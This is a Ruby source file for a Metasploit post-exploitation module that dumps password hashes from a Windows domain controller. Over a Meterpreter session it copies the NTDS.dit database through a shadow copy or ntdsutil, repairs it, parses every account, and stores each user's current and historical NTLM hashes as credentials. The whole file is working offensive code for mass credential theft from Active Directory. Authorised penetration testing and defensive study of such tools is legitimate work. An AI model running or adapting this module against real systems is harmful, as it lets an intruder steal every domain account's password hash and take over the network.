##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'
require 'metasploit/framework/ntds/parser'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::ShadowCopy
  include Msf::Post::File

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Domain Controller Hashdump',
      'Description'   => %q{
        This module attempts to copy the NTDS.dit database from a live Domain Controller
        and then parse out all of the User Accounts. It saves all of the captured password
        hashes, including historical ones.
  },
      'License'       => MSF_LICENSE,
      'Author'        => ['theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
  ))
    deregister_options('SMBUser','SMBPass', 'SMBDomain')
  end

  def run
    if preconditions_met?
      ntds_file = copy_database_file
      unless ntds_file.nil?
        print_status "Repairing NTDS database after copy..."
        print_status repair_ntds(ntds_file)
        realm = sysinfo["Domain"]
        ntds_parser = Metasploit::Framework::NTDS::Parser.new(client, ntds_file)
        ntds_parser.each_account do |ad_account|
          print_good ad_account.to_s
          report_hash(ad_account.ntlm_hash.downcase, ad_account.name, realm)
          ad_account.nt_history.each_with_index do |nt_hash, index|
            hash_string = ad_account.lm_history[index] || Metasploit::Credential::NTLMHash::BLANK_LM_HASH
            hash_string << ":#{nt_hash}"
            report_hash(hash_string.downcase,ad_account.name, realm)
          end
        end
        rm_f(ntds_file)
      end
    end
  end

  def copy_database_file
    database_file_path = nil
    if start_vss
      case  sysinfo["OS"]
        when /2003| \.NET/
          database_file_path = vss_method
        when /2008|2012/
          database_file_path = ntdsutil_method
        else
          print_error "This version of Windows is unsupported"
      end
    end
    database_file_path
  end

  def is_domain_controller?
    if ntds_location
      file_exist?("#{ntds_location}\\ntds.dit")
    else
      false
    end
  end

  def ntds_location
    @ntds_location ||= registry_getvaldata("HKLM\\SYSTEM\\CurrentControlSet\\services\\NTDS\\Parameters\\","DSA Working Directory")
  end

  def ntdsutil_method
    tmp_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
    command_arguments = "\"activate instance ntds\" \"ifm\" \"Create Full #{tmp_path}\" quit quit"
    result = cmd_exec("ntdsutil.exe", command_arguments,90)
    if result.include? "IFM media created successfully"
      file_path = "#{tmp_path}\\Active Directory\\ntds.dit"
      print_status "NTDS database copied to #{file_path}"
    else
      print_error "There was an error copying the ntds.dit file!"
      vprint_error result
      file_path = nil
    end
    file_path
  end


  def preconditions_met?
    unless is_admin?
      print_error "This module requires Admin privs to run"
      return false
    end
    unless is_domain_controller?
      print_error "This does not appear to be an AD Domain Controller"
      return false
    end
    unless session_compat?
      return false
    end
    return true
  end

  def repair_ntds(path='')
    arguments = "/p /o \"#{path}\""
    cmd_exec("esentutl", arguments)
  end

  def report_hash(ntlm_hash, username, realm)
    cred_details = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: self.refname,
      private_type: :ntlm_hash,
      private_data: ntlm_hash,
      username: username,
      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
      realm_value: realm,
      workspace_id: myworkspace_id
    }
    create_credential(cred_details)
  end

  def session_compat?
    if sysinfo['Architecture'] =~ /x64/ && session.platform =~ /x86/
      print_error "You are running 32-bit Meterpreter on a 64 bit system"
      print_error "Try migrating to a 64-bit process and try again"
      false
    else
      true
    end
  end

  def vss_method
    location = ntds_location.dup
    volume = location.slice!(0,3)
    id = create_shadowcopy("#{volume}")
    print_status "Getting Details of ShadowCopy #{id}"
    sc_details = get_sc_details(id)
    sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
    target_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
    print_status "Moving ntds.dit to #{target_path}"
    move_file(sc_path, target_path)
    target_path
  end

end
